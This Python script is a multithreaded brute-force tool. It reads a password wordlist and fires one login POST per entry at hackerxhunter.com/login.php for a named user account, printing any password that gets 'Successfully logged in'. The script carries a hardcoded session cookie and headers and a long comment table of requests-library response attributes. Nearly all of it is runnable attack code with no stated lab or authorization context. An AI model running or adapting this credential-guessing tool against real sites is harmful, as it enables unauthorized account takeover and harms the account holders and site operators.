# Threading in python is used to run multiple threads (tasks, function calls) at the same time.
import threading

# The requests library is the de facto standard for making HTTP requests in Python.
import requests

import time


def run_request(password_payload):

    cookies = {
        'pvisitor': '6d84629e-c5ea-41f7-9291-0265bfb0e33c',
    }

    headers = {
        'Host': 'hackerxhunter.com',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://hackerxhunter.com/login.php',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '40',
        'Origin': 'http://hackerxhunter.com',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }

    data = 'uname=reymarkdivino&psw='+password_payload+'&remember=on'

    response = requests.post('http://hackerxhunter.com/login.php', headers=headers, cookies=cookies, data=data, verify=False)


    output = response_text_checker(response,password_payload)

    return output
#____________________________________________________
# Property/Method               Description          |
#____________________________________________________|
# apparent_encoding       |Returns the apparent encoding
# close()                 |Closes the connection to the server
# content                 |Returns the content of the response, in bytes
# cookies                 |Returns a CookieJar object with the cookies sent back from the server
# elapsed                 |Returns a timedelta object with the time elapsed from sending the request to the arrival of the response
# encoding                |Returns the encoding used to decode r.text
# headers                 |Returns a dictionary of response headers
# history                 |Returns a list of response objects holding the history of request (url)
# is_permanent_redirect   |Returns True if the response is the permanent redirected url, otherwise False
# is_redirect             |Returns True if the response was redirected, otherwise False
# iter_content()          |Iterates over the response
# iter_lines()            |Iterates over the lines of the response
# json()                  |Returns a JSON object of the result (if the result was written in JSON format, if not it raises an error)
# links                   |Returns the header links
# next                    |Returns a PreparedRequest object for the next request in a redirection
# ok                      |Returns True if status_code is less than 400, otherwise False
# raise_for_status()      |If an error occur, this method returns a HTTPError object
# reason                  |Returns a text corresponding to the status code
# request                 |Returns the request object that requested this response
# status_code             |Returns a number that indicates the status (200 is OK, 404 is Not Found)
# text                    |Returns the content of the response, in unicode
# url                     |Returns the URL of the response


def response_text_checker(response,password_payload):

    if 'Successfully logged in' in response.text:
        print(f"!!![PASSWORD FOUND ~~ : ~~ {password_payload} ]")

    # ELSE
    if 'Incorrect Username or Password' in response.text:
        print(f"INCORRECT: ~~ {password_payload}")

        
def main():
    # perf_counter() function always returns the float value of time in seconds
    start = time.perf_counter()

    # START YOUR MAIN FUNCTIONS HERE

    path_of_password_payload_text_file = input("List of password payload: ").strip() 

    list_of_threads = []

    # Open the file for reading
    with open(path_of_password_payload_text_file, "r") as a_file:

        for password in a_file:
            
            new_thread = threading.Thread(target=run_request, args=[password])
            new_thread.start() 

            list_of_threads.append(new_thread)
            


        # Join all thread
        for thread in list_of_threads:
            thread.join()

    # Lets get the finish time of code run
    finish = time.perf_counter()

    print(f'\n\nFinished in {round(finish-start, 2)} second(s)\n')

        
if __name__ == '__main__':
    main()